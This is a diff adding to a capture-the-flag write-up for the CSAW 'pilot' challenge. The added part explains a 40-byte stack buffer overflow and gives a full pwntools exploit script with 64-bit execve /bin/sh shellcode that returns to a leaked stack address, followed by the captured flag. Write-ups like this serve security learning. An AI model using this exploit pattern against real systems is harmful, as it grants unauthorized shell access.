@@ -44,4 +44,33 @@ So if you didn't read the [function prologue](https://en.wikipedia.org/wiki/Func
 
 In the picture above the ```RBP``` stands for base pointer, and wee see it's: ```RBP: 0x4a4a4a4a49494949 ('IIIIJJJJ')```. Hence, it took from A (four times) to J (four times) to overwrite into the return address (total of 40 characters).
 
+So we can write some shellcode that will execute to /bin/sh to get us a shell running as the host (pilot). Doing some researching we find shell code for 64 bit /bin/sh exploit [here](http://shell-storm.org/shellcode/files/shellcode-811.php).
+
+Here is the code I came up with (also attached above):
+```python
+# Exploit for the pilot CSAW challenge
+
+from pwn import *
+
+session = remote("10.67.0.1", 30983)
+
+session.recvuntil("[*]Location:")
+
+address = session.recvuntil("\n")[:-1]
+
+shellcode = "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"
+
+payload = shellcode + "A" * (40-len(shellcode)) + p64(int(address, 16)) 
+
+print("Address: " + str(address))
+print("total payload: " + str(payload))
+
+session.sendline(payload)
+
+session.interactive()
+```
+
+Running the code will come up with the flag:
+```flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}```
+
 ### in progress
